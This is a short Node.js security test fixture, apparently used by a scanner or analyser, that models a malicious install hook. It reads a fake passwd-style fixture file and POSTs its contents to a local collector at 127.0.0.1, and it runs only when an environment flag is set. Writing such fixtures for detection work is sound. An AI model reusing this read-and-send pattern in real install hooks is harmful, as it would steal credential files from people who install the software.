// SECURITY TEST FIXTURE: analysed statically, never executed.
// Models a malicious install hook: read a passwd-style file and POST it to a
// collector. Targets are the fabricated fixture file and 127.0.0.1 only.
const fs = require("fs");
const http = require("http");
const path = require("path");

if (process.env.SECURITY_FIXTURE_ALLOW_RUN !== "1") {
  process.exit(0);
}

const data = fs.readFileSync(
  path.join(__dirname, "..", "fixtures", "fake_passwd.txt"),
  "utf8"
);

const req = http.request({
  host: "127.0.0.1",
  port: 8765,
  path: "/collect",
  method: "POST",
  headers: { "Content-Type": "text/plain" },
});
req.end(data);
